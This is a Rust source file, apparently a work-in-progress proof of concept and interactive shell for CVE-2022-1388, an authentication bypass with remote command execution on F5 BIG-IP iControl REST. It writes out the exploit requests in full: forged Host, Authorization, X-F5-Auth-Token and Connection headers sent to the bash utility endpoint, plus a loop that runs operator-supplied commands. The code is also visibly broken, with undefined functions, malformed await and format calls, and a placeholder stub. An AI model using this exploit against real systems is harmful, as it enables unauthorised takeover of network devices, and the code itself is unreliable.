// Copyright (c) 2022 Petruknisme
// 
// This software is released under the MIT License.
// https://opensource.org/licenses/MIT

extern crate clap;
extern crate colored;

use clap::Parser;
use colored::Colorize;
use url::Url;
use reqwest;
use snailquote::unescape;
use std::io::Write;
use std::collections::HashMap;



#[derive(Parser)]
#[clap(name = "CVE-2022-1388 PoC")]
#[clap(author = "Petruknisme <me@petruknisme.com>")]
#[clap(version = "1.0")]
#[clap(about = "Scanner and Interactive shell for CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE written in Rust", long_about = None)]


struct Cli {
    /// F5 Big-IP target url
    #[clap(short, long)]
    url: String,

    /// This mode for accessing payload with interactive shell
    #[clap(short, long)]
    shell: bool,
    
    /// Scanner mode
    #[clap(short, long)]
    scan: Option<String>,
    

}

#[tokio::main]
async fn check_shell_exist(url: &str) -> bool{
    let response = reqwest::
                    get(url).await.unwrap();

    if response.status().as_str() == "200" {
        return true;
    }else{
        return false;
    }
}

fn prompt(name:&str) -> String {
    let mut line = String::new();
    print!("{}", name);
    std::io::stdout().flush().unwrap();
    std::io::stdin().read_line(&mut line).expect("Error: Could not read a line");
 
    return line.trim().to_string()
}

#[tokio::main]
async fn send_json(url: &str, cmd: HashMap) -> Result<(), reqwest::Error>{

    // PUT THE JSON DATA HERE WITH SERDE
    
    let client = reqwest::Client::new();
    let response = client
            .post(url)
            .header("Host", "127.0.0.1")
            .header("Authorization", "Basic YWRtaW46aG9yaXpvbjM=")
            .header("X-F5-Auth-Token", "aToZ")
            .header("Connection", "X-F5-Auth-Token")
            .json(&cmd)
            .send()
            .await
            .json()
            .await();

    return response;
}

fn main() {
    let cli = Cli::parse();
    let url = format!("{}/mgmt/tm/util/bash", cli.url);
    let shell = cli.shell;
    let mut cmd = "whoami";
    let mut json_data = HashMap::new();
            json_data.insert("command", "run");
            json_data.insert("utilCmdArgs", format!("-c {}", &cmd));
    
    println!("{}", "\t\tScanner and Interactive shell for CVE-2022-1388 F5 BIG-IP iControl REST Auth Bypass RCE written in Rust\n".yellow());
    println!("{} {}",
            "[*] Target:  ".blue(),
            url.red() 
    );

    println!("{}", "Checking if target is vulnerable...");
    let resp = get_data_from_url(&url, &json_data);

    if resp.status().as_str() == "401" {
        println!("{}", "401 Client Error: F5 Authorization Required");
        println!("{}", "Target not vulnerable!");
    }
    else if resp.status().as_str == "200" {
        println!()
    }

    // Get current user and hostname
    // echo `whoami`@`cat /proc/sys/kernel/hostname`

    // If target is vuln
    
    println!("{}", "Please input the command to run");
    loop {
        let input=prompt("> ");
        if input=="exit" { 
            break; 
        };
        let exploit_url = format!("{}", &url, input);
        let resp = get_data_from_url(&exploit_url);
        let rs: Vec<String> = resp.split("\n\u{0}").map(|s| s.to_string()).collect();
        println!("{}", unescape(&rs[0]).unwrap());
    }

}